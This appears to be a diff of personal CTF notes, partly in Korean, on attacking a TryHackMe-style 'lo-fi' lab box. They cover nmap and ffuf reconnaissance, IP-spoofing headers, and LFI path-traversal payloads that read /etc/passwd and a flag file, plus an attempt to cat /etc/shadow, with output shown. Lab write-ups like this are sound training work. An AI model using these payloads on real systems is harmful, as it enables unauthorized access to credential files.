@@ -1,5 +1,5 @@
-Nmap 7.95 scan initiated Sun Jun 8 08:04:11 2025 as: /usr/lib/nmap/nmap -sC -sV -O -oN scan.txt -p- 10.10.148.214
-Nmap scan report for 10.10.148.214
+Nmap 7.95 scan initiated Sun Jun 8 08:04:11 2025 as: /usr/lib/nmap/nmap -sC -sV -O -oN scan.txt -p- 10.10.126.200
+Nmap scan report for 10.10.126.200
 Host is up (0.21s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT STATE SERVICE VERSION
@@ -28,11 +28,11 @@ OS and Service detection performed. Please report any incorrect results at https
 
 # -H 옵션은 HTTP 헤더 전체를 넣어야 하ㅂ니다
 
-ffuf -u http://10.10.148.214 -H "Host: FUZZ.lofi" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 4162 -t 50
+ffuf -u http://10.10.126.200 -H "Host: FUZZ.lofi" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 4162 -t 50
 
 # DNS 경로 검색 방식
 
-ffuf -u http://10.10.148.214/FUZZ -w wordlist.txt
+ffuf -u http://10.10.126.200/FUZZ -w wordlist.txt
 
 | 목적                          | 헤더 필요 여부 | 예시                              |
 | ----------------------------- | -------------- | --------------------------------- |
@@ -44,7 +44,7 @@ ffuf -u http://10.10.148.214/FUZZ -w wordlist.txt
 
 -fs 4162
 
-ffuf -u http://10.10.148.214/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -o ffuf.txt
+ffuf -u http://10.10.126.200/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -o ffuf.txt
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -58,7 +58,7 @@ ffuf -u http://10.10.148.214/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web
 ---
 
 :: Method : GET
-:: URL : http://10.10.148.214/FUZZ
+:: URL : http://10.10.126.200/FUZZ
 :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration : false
@@ -115,10 +115,67 @@ server-status [Status: 403, Size: 294, Words: 21, Lines: 11, Duration: 338ms]
 
 # ip 우회
 
-curl -i http://10.10.148.214/.htaccess \
+curl -i http://10.10.126.200/.htaccess \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "Client-IP: 127.0.0.1" \
  -H "X-Client-IP: 127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1" \
  -H "X-Remote-Addr: 127.0.0.1"
+
+# install SEclists
+
+git clone https://github.com/danielmiessler/SecLists.git
+
+# /etc/hosts
+
+echo "10.10.126.200 lo-fi.thm" >> /etc/hosts
+echo "10.10.126.200 lo-fi.thm" >> /etc/hosts
+
+cat /etc/hosts
+
+# file traversal
+
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://lo-fi.thm/?page=FUZZ" -fl 124 -mc 200
+
+# http
+
+http http://lo-fi.thm/?page=%0a/bin/cat%20/etc/shadow
+
+```html
+<div class="alert alert-danger" role="alert"> Sorry, <code>
+/bin/cat /etc/shadow</code> does not exist. </div> </div>
+</div>
+```
+
+http http://lo-fi.thm/?page=
+http http://lo-fi.thm/?page=/../../etc/passwd
+http http://lo-fi.thm/?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+
+# 틀림 -> 절대 경로를 허용하는 경우는 극히 드물다
+
+http http://lo-fi.thm/?page=/../../../../../../../flag.txt
+
+# 맞음 -> 상위 폴더로 이동해야 하므로 일반적으로 .. 로 시작
+
+http http://lo-fi.thm/?page=../../../flag.txt
